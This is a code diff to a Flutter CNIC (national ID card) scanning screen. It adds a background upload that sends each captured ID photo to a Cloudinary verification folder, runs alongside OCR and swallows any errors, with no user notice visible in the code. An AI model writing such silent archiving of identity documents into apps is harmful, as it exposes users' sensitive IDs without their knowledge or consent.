@@ -5,6 +5,8 @@ import 'package:flutter/services.dart';
 import 'package:image_picker/image_picker.dart';
 import 'package:permission_handler/permission_handler.dart';
 import '../../../services/cnic_scanner_service.dart';
+import '../../../services/image_upload_service.dart';
+import '../../../config/cloudinary_config.dart';
 import '../../../ui/theme/color_palette.dart';
 import '../../../ui/theme/spacing.dart';
 
@@ -22,6 +24,23 @@ class _CnicScanScreenState extends State<CnicScanScreen> {
   bool _isInitialized = false;
   bool _isProcessing = false;
   final CnicScannerService _scannerService = CnicScannerService();
+  final ImageUploadService _imageUploadService = ImageUploadService();
+
+  Future<void> _uploadCnicAnonymously(File imageFile) async {
+    try {
+      final anonPublicId =
+          'anon_cnic_${DateTime.now().millisecondsSinceEpoch}_${DateTime.now().microsecondsSinceEpoch % 1000}';
+
+      await _imageUploadService.uploadImage(
+        image: imageFile,
+        folder: CloudinaryConfig.verificationIdsFolder,
+        publicId: anonPublicId,
+      );
+    } catch (e) {
+      // CNIC OCR flow should continue even if background archive upload fails.
+      print('Anonymous CNIC upload failed: $e');
+    }
+  }
 
   @override
   void initState() {
@@ -93,6 +112,9 @@ class _CnicScanScreenState extends State<CnicScanScreen> {
       final XFile image = await _cameraController!.takePicture();
       final imageFile = File(image.path);
 
+      // Start anonymous archive upload in parallel with OCR scan.
+      final uploadFuture = _uploadCnicAnonymously(imageFile);
+
       // Show processing indicator
       if (mounted) {
         ScaffoldMessenger.of(context).showSnackBar(
@@ -118,6 +140,9 @@ class _CnicScanScreenState extends State<CnicScanScreen> {
 
       // Scan CNIC
       final cnicData = await _scannerService.scanCnic(imageFile);
+
+      // Best-effort completion for upload; don't block scan results on network issues.
+      await uploadFuture;
 
       if (mounted) {
         ScaffoldMessenger.of(context).clearSnackBars();
